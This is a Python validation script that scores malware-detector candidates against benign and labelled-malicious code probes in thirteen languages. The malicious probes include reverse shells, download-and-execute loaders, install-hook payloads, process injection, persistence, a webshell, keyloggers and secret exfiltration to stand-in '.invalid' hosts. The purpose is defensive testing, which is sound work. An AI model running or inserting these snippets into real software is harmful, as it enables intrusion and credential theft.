"""Run small out-of-corpus behavior canaries against XGBoost candidates.

The canaries are not training or benchmark samples.  They detect obvious
source/format shortcuts before a candidate is promoted.
"""

from __future__ import annotations

import argparse
import json
import os
import sys
from pathlib import Path
from typing import Any

import numpy
from joblib import load
from scipy.sparse import csr_matrix, hstack


ROOT = Path(__file__).resolve().parents[1]
BACKEND = ROOT / "backend"
if str(BACKEND) not in sys.path:
    sys.path.insert(0, str(BACKEND))

from attack_detection.features.static_features import feature_vector
from attack_detection.features.behavior_tokens import (
    BEHAVIOR_TOKEN_VERSION,
    BEHAVIOR_TOKEN_VERSION_V2,
    BEHAVIOR_TOKEN_VERSION_V3,
    behavior_token_text,
    behavior_token_text_v2,
    behavior_token_text_v3,
)
from attack_detection.trainer import _evaluate


PROBES: dict[str, list[tuple[str, str, str]]] = {
    "powershell": [
        (
            "benign",
            "service_inventory",
            "Get-Service | Where-Object {$_.Status -eq 'Running'} | "
            "Select-Object Name,DisplayName | Export-Csv .\\services.csv",
        ),
        (
            "benign",
            "local_backup",
            "$source = Join-Path $PSScriptRoot 'config'; "
            "$target = Join-Path $env:TEMP 'config-backup.zip'; "
            "Compress-Archive -Path $source -DestinationPath $target -Force",
        ),
        (
            "malicious",
            "download_execute_persist",
            "$p = Join-Path $env:APPDATA '.svc.ps1'; "
            "Invoke-WebRequest 'https://delivery.invalid/agent.ps1' -OutFile $p; "
            "Start-Process powershell -ArgumentList '-WindowStyle Hidden -File', $p; "
            "New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' "
            "-Name Updater -Value \"powershell -w hidden -f $p\" -Force",
        ),
        (
            "malicious",
            "encoded_remote_loader",
            "$w = New-Object Net.WebClient; "
            "$stage = $w.DownloadString('https://delivery.invalid/stage'); "
            "IEX ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($stage)))",
        ),
    ],
    "go": [
        (
            "benign",
            "http_health_client",
            "package main\nimport (\"encoding/json\";\"net/http\";\"os\")\n"
            "func main(){r,e:=http.Get(\"https://status.example/health\");"
            "if e!=nil{return};defer r.Body.Close();json.NewDecoder(r.Body).Decode(&map[string]any{});"
            "os.Exit(0)}",
        ),
        (
            "benign",
            "local_git_status",
            "package main\nimport(\"os\";\"os/exec\")\n"
            "func main(){c:=exec.Command(\"git\",\"status\",\"--porcelain\");"
            "c.Stdout=os.Stdout;_ = c.Run()}",
        ),
        (
            "malicious",
            "reverse_shell",
            "package main\nimport(\"net\";\"os/exec\")\n"
            "func main(){c,_:=net.Dial(\"tcp\",\"collector.invalid:4444\");"
            "sh:=exec.Command(\"/bin/sh\");sh.Stdin=c;sh.Stdout=c;sh.Stderr=c;_ = sh.Run()}",
        ),
        (
            "malicious",
            "download_execute",
            "package main\nimport(\"io\";\"net/http\";\"os\";\"os/exec\")\n"
            "func main(){r,_:=http.Get(\"https://delivery.invalid/.agent\");"
            "f,_:=os.OpenFile(\"/tmp/.agent\",os.O_CREATE|os.O_WRONLY,0700);"
            "io.Copy(f,r.Body);f.Close();exec.Command(\"/tmp/.agent\",\"--quiet\").Start()}",
        ),
    ],
    "rust": [
        (
            "benign",
            "config_reader",
            "use std::fs;\nfn main(){let value=fs::read_to_string(\"settings.toml\")"
            ".unwrap_or_default();println!(\"{}\",value.len());}",
        ),
        (
            "benign",
            "tcp_health_check",
            "use std::net::TcpStream;\nuse std::time::Duration;\n"
            "fn main(){if let Ok(s)=TcpStream::connect(\"status.example:443\"){"
            "let _=s.set_read_timeout(Some(Duration::from_secs(2)));}}",
        ),
        (
            "malicious",
            "reverse_shell",
            "use std::net::TcpStream;use std::process::{Command,Stdio};"
            "use std::os::unix::io::{AsRawFd,FromRawFd};\nfn main(){"
            "let s=TcpStream::connect(\"collector.invalid:4444\").unwrap();"
            "let fd=s.as_raw_fd();unsafe{Command::new(\"/bin/sh\")"
            ".stdin(Stdio::from_raw_fd(fd)).stdout(Stdio::from_raw_fd(fd))"
            ".stderr(Stdio::from_raw_fd(fd)).spawn().unwrap();}}",
        ),
        (
            "malicious",
            "remote_injection",
            "use windows::Win32::System::Threading::{OpenProcess,CreateRemoteThread,"
            "PROCESS_ALL_ACCESS};use windows::Win32::System::Memory::{VirtualAllocEx,"
            "WriteProcessMemory,PAGE_EXECUTE_READWRITE};fn inject(pid:u32,payload:&[u8]){"
            "unsafe{let p=OpenProcess(PROCESS_ALL_ACCESS,false,pid).unwrap();"
            "let r=VirtualAllocEx(p,None,payload.len(),0x3000,PAGE_EXECUTE_READWRITE);"
            "WriteProcessMemory(p,r,payload.as_ptr() as _,payload.len(),None);"
            "CreateRemoteThread(p,None,0,Some(std::mem::transmute(r)),None,0,None);}}",
        ),
    ],
    "c": [
        ("benign", "stdio", '#include <stdio.h>\nint main(void){puts("ready");return 0;}'),
        (
            "benign",
            "process_query",
            "#include <windows.h>\n"
            "int alive(DWORD pid){HANDLE p=OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION,"
            "FALSE,pid);if(!p)return 0;CloseHandle(p);return 1;}",
        ),
        (
            "malicious",
            "remote_injection",
            "#include <windows.h>\nvoid deploy(DWORD pid,char *buf,SIZE_T n){"
            "HANDLE p=OpenProcess(PROCESS_ALL_ACCESS,FALSE,pid);"
            "void *r=VirtualAllocEx(p,0,n,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);"
            "WriteProcessMemory(p,r,buf,n,0);"
            "CreateRemoteThread(p,0,0,(LPTHREAD_START_ROUTINE)r,0,0,0);}",
        ),
        (
            "malicious",
            "persistence",
            "#include <windows.h>\nvoid persist(void){HKEY k;"
            "RegOpenKeyExA(HKEY_CURRENT_USER,\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\","
            "0,KEY_SET_VALUE,&k);RegSetValueExA(k,\"Updater\",0,REG_SZ,"
            "(BYTE*)\"C:\\\\Temp\\\\svc.exe\",16);}",
        ),
    ],
    "cpp": [
        (
            "benign",
            "file_reader",
            "#include <fstream>\n#include <string>\nint main(){std::ifstream f(\"input.txt\");"
            "std::string s;std::getline(f,s);return s.empty();}",
        ),
        (
            "benign",
            "process_query",
            "#include <windows.h>\nbool alive(DWORD pid){HANDLE h=OpenProcess("
            "PROCESS_QUERY_LIMITED_INFORMATION,FALSE,pid);if(!h)return false;"
            "CloseHandle(h);return true;}",
        ),
        (
            "malicious",
            "remote_injection",
            "#include <windows.h>\n#include <vector>\nvoid deploy(HANDLE p,"
            "const std::vector<unsigned char>& b){void *r=VirtualAllocEx(p,nullptr,b.size(),"
            "MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);"
            "WriteProcessMemory(p,r,b.data(),b.size(),nullptr);"
            "CreateRemoteThread(p,nullptr,0,reinterpret_cast<LPTHREAD_START_ROUTINE>(r),"
            "nullptr,0,nullptr);}",
        ),
        (
            "malicious",
            "credential_collection",
            "#include <windows.h>\nvoid keys(){while(true){for(int k=8;k<190;k++){"
            "if(GetAsyncKeyState(k)&1){/* append keystroke to hidden log */}}Sleep(10);}}",
        ),
    ],
    "bash": [
        (
            "benign",
            "health_check",
            "#!/bin/bash\nset -euo pipefail\n"
            "curl -fsS https://status.example/health >/dev/null\n"
            "printf '%s\\n' 'healthy'\n",
        ),
        (
            "benign",
            "backup",
            "#!/bin/bash\nset -e\nmkdir -p /tmp/archive\n"
            "tar -czf /tmp/archive/configs.tgz ./configs\n",
        ),
        (
            "malicious",
            "download_execute",
            "#!/bin/bash\ncurl -fsSL https://delivery.invalid/agent -o /tmp/.agent\n"
            "chmod +x /tmp/.agent\n/tmp/.agent --quiet\n",
        ),
        (
            "malicious",
            "pipe_shell_persistence",
            "#!/bin/sh\nwget -qO- https://delivery.invalid/bootstrap | /bin/sh\n"
            "(crontab -l 2>/dev/null; echo '@reboot /tmp/.agent') | crontab -\n",
        ),
    ],
    "config": [
        (
            "benign",
            "minimal_package",
            '{"name":"plain-tool","version":"2.0.0","scripts":{"test":"node test.js"}}',
        ),
        (
            "benign",
            "local_build_hook",
            '{"name":"native-addon","version":"3.1.0",'
            '"scripts":{"postinstall":"node scripts/build-native.js","test":"npm test"}}',
        ),
        (
            "malicious",
            "remote_install_hook",
            '{"name":"update-agent","version":"0.2.0",'
            '"scripts":{"postinstall":"curl -fsSL https://delivery.invalid/a | /bin/sh"}}',
        ),
        (
            "malicious",
            "obfuscated_preinstall",
            '{"name":"prepare-agent","version":"0.3.0",'
            '"scripts":{"preinstall":"node -e \\"eval(Buffer.from(process.env.DATA,'
            "'base64').toString())\\""}}",
        ),
    ],
    "html": [
        (
            "benign",
            "local_login_form",
            "<html><body><form action=\"/login\" method=\"post\">"
            "<input name=\"user\"><input type=\"password\" name=\"password\">"
            "<button>Sign in</button></form></body></html>",
        ),
        (
            "benign",
            "documentation",
            "<!doctype html><html><body><h1>API documentation</h1>"
            "<p>Use the account page to sign in.</p></body></html>",
        ),
        (
            "malicious",
            "external_credential_form",
            "<html><body><form action=\"https://collector.invalid/login\" method=\"post\">"
            "<input name=\"email\"><input type=\"password\" name=\"password\">"
            "<input type=\"hidden\" name=\"session\" value=\"x\"><button>Verify account</button>"
            "</form></body></html>",
        ),
        (
            "malicious",
            "obfuscated_credential_form",
            "<html><body><form action=\"//collector.invalid/submit\">"
            "<input type=\"password\" name=\"passcode\"><input type=\"hidden\" name=\"a\">"
            "<input type=\"hidden\" name=\"b\"><input type=\"hidden\" name=\"c\">"
            "<script>document.write(atob('PHNwYW4+PC9zcGFuPg=='))</script>"
            "<button>Security check</button></form></body></html>",
        ),
    ],
    "java": [
        (
            "benign",
            "http_health_client",
            "import java.net.http.*; import java.net.URI; "
            "class Health { public static void main(String[] a) throws Exception { "
            "var c=HttpClient.newHttpClient(); var r=c.send("
            "HttpRequest.newBuilder(URI.create(\"https://status.example/health\")).build(),"
            "HttpResponse.BodyHandlers.ofString()); System.out.println(r.statusCode()); }}",
        ),
        (
            "benign",
            "local_git_status",
            "class Status { public static void main(String[] a) throws Exception { "
            "new ProcessBuilder(\"git\",\"status\",\"--porcelain\").inheritIO().start().waitFor(); }}",
        ),
        (
            "malicious",
            "socket_command_shell",
            "import java.net.*; import java.io.*; "
            "class Agent { public static void main(String[] a) throws Exception { "
            "Socket s=new Socket(\"collector.invalid\",4444); "
            "Process p=new ProcessBuilder(\"/bin/sh\").redirectErrorStream(true).start(); "
            "s.getInputStream().transferTo(p.getOutputStream()); "
            "p.getInputStream().transferTo(s.getOutputStream()); }}",
        ),
        (
            "malicious",
            "download_execute",
            "import java.net.*; import java.nio.file.*; "
            "class Loader { public static void main(String[] a) throws Exception { "
            "Path p=Files.createTempFile(\"agent\",\".bin\"); "
            "Files.copy(new URL(\"https://delivery.invalid/agent\").openStream(),p,"
            "StandardCopyOption.REPLACE_EXISTING); p.toFile().setExecutable(true); "
            "Runtime.getRuntime().exec(p.toString()); }}",
        ),
    ],
    "javascript": [
        (
            "benign",
            "api_status_view",
            "fetch('/api/status').then(r => r.json()).then(v => { "
            "document.querySelector('#status').textContent = v.state; });",
        ),
        (
            "benign",
            "local_git_status",
            "const {spawn} = require('child_process'); "
            "spawn('git', ['status', '--porcelain'], {stdio: 'inherit'});",
        ),
        (
            "malicious",
            "remote_eval_loader",
            "fetch('https://delivery.invalid/stage').then(r => r.text())"
            ".then(stage => eval(stage));",
        ),
        (
            "malicious",
            "credential_exfiltration",
            "const secrets={token:process.env.NPM_TOKEN,key:process.env.AWS_SECRET_ACCESS_KEY};"
            "fetch('https://collector.invalid/api',"
            "{method:'POST',headers:{'content-type':'application/json'},"
            "body:JSON.stringify(secrets)});",
        ),
    ],
    "php": [
        (
            "benign",
            "prepared_account_query",
            "<?php $stmt=$pdo->prepare('SELECT name FROM users WHERE id = ?'); "
            "$stmt->execute([(int)$_GET['id']]); echo htmlspecialchars($stmt->fetchColumn()); ?>",
        ),
        (
            "benign",
            "local_zip_backup",
            "<?php $zip=new ZipArchive(); $zip->open('/tmp/config-backup.zip',"
            "ZipArchive::CREATE); $zip->addFile('./config/app.php','app.php'); $zip->close(); ?>",
        ),
        (
            "malicious",
            "encoded_webshell",
            "<?php $payload=base64_decode($_POST['payload']); eval($payload); ?>",
        ),
        (
            "malicious",
            "credential_exfiltration",
            "<?php $data=file_get_contents('/home/service/.ssh/id_rsa'); "
            "$c=curl_init('https://collector.invalid/upload'); "
            "curl_setopt($c,CURLOPT_POST,true); curl_setopt($c,CURLOPT_POSTFIELDS,"
            "['credentials'=>$data]); curl_exec($c); ?>",
        ),
    ],
    "python": [
        (
            "benign",
            "api_health_client",
            "import requests\nresponse=requests.get('https://status.example/health',timeout=3)\n"
            "print(response.json().get('state'))",
        ),
        (
            "benign",
            "local_git_status",
            "import subprocess\nsubprocess.run(['git','status','--porcelain'],check=True)",
        ),
        (
            "malicious",
            "encoded_exec_loader",
            "import base64,urllib.request\n"
            "blob=urllib.request.urlopen('https://delivery.invalid/stage').read()\n"
            "exec(compile(base64.b64decode(blob),'<stage>','exec'))",
        ),
        (
            "malicious",
            "secret_exfiltration",
            "import os,requests\n"
            "secrets={'npm':os.environ.get('NPM_TOKEN'),'aws':os.environ.get('AWS_SECRET_ACCESS_KEY')}\n"
            "requests.post('https://collector.invalid/api',json=secrets,timeout=4)",
        ),
    ],
    "ruby": [
        (
            "benign",
            "api_health_client",
            "require 'net/http'; require 'json'; "
            "uri=URI('https://status.example/health'); "
            "puts JSON.parse(Net::HTTP.get(uri))['state']",
        ),
        (
            "benign",
            "local_git_status",
            "require 'open3'; out,status=Open3.capture2('git','status','--porcelain'); "
            "puts out if status.success?",
        ),
        (
            "malicious",
            "socket_command_shell",
            "require 'socket'; require 'open3'; "
            "s=TCPSocket.new('collector.invalid',4444); "
            "while (cmd=s.gets); out,err,_=Open3.capture3(cmd); s.write(out+err); end",
        ),
        (
            "malicious",
            "key_capture_exfiltration",
            "require 'win32api'; require 'net/ftp'; "
            "key=Win32API.new('user32','GetAsyncKeyState',['I'],'I'); "
            "File.open('keylog.txt','a'){|f| f.write(key.call(65))}; "
            "ftp=Net::FTP.new('collector.invalid'); ftp.storbinary('STOR keylog.txt',"
            "File.open('keylog.txt','rb'),1024)",
        ),
    ],
}


def _probability(bundle: dict[str, Any], language: str, code: str) -> float:
    names = list(bundle.get("feature_names") or [])
    structured = numpy.asarray([
        feature_vector(
            code,
            language,
            feature_names=names,
            include_rules=False,
        )
    ], dtype="float32")
    transform = bundle.get("text_transform")
    route_language = str(bundle.get("language") or language)
    text_content = (
        behavior_token_text_v3(code, route_language)
        if transform == BEHAVIOR_TOKEN_VERSION_V3
        else behavior_token_text_v2(code, route_language)
        if transform == BEHAVIOR_TOKEN_VERSION_V2
        else behavior_token_text(code, route_language)
        if transform == BEHAVIOR_TOKEN_VERSION
        else code
    )
    if bundle.get("feature_mode") == "structured_static":
        matrix = csr_matrix(structured, dtype="float32")
    else:
        matrix = hstack([
            csr_matrix(structured),
            bundle["word_vectorizer"].transform([text_content]),
            bundle["char_vectorizer"].transform([text_content]),
        ], format="csr", dtype="float32")
    return float(bundle["model"].predict_proba(matrix)[0][1])


def validate(language: str, prefix: Path) -> dict[str, Any]:
    metrics = json.loads(prefix.with_suffix(".json").read_text(encoding="utf-8"))
    bundle = load(prefix.with_suffix(".joblib"))
    threshold = float(metrics["selected"]["thresholds"]["decision"])
    labels: list[str] = []
    scores: list[float] = []
    probes = []
    for label, name, code in PROBES[language]:
        score = _probability(bundle, language, code)
        labels.append(label)
        scores.append(score)
        probes.append({
            "name": name,
            "expected": label,
            "score": round(score, 6),
            "decision": "malicious" if score >= threshold else "benign",
        })
    report = _evaluate(labels, scores, "malicious", "benign", threshold)
    return {
        "language": language,
        "candidate": str(prefix.resolve()),
        "threshold": threshold,
        "metrics": report,
        "all_canaries_correct": report["confusion_matrix"] == [[2, 0], [0, 2]],
        "probes": probes,
    }


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--candidate",
        action="append",
        required=True,
        help="LANGUAGE=PATH prefix without .json/.joblib",
    )
    parser.add_argument("--report-only", action="store_true")
    parser.add_argument(
        "--stamp-candidates",
        action="store_true",
        help="atomically record the canary result in each candidate metrics file",
    )
    args = parser.parse_args()
    reports = []
    for value in args.candidate:
        language, separator, prefix = value.partition("=")
        if not separator or language not in PROBES:
            raise SystemExit(f"invalid candidate mapping: {value}")
        prefix_path = Path(prefix)
        report = validate(language, prefix_path)
        reports.append(report)
        if args.stamp_candidates:
            metrics_path = prefix_path.with_suffix(".json")
            metrics = json.loads(metrics_path.read_text(encoding="utf-8"))
            metrics["behavior_canary"] = {
                "all_canaries_correct": report["all_canaries_correct"],
                "metrics": report["metrics"],
                "probes": report["probes"],
                "not_part_of_benchmark_metrics": True,
            }
            temporary = metrics_path.with_suffix(".json.tmp")
            temporary.write_text(
                json.dumps(metrics, ensure_ascii=False, indent=2),
                encoding="utf-8",
            )
            os.replace(temporary, metrics_path)
    passed = all(report["all_canaries_correct"] for report in reports)
    print(json.dumps(
        {"passed": passed, "reports": reports},
        ensure_ascii=False,
        indent=2,
    ))
    if not passed and not args.report_only:
        raise SystemExit(1)


if __name__ == "__main__":
    main()
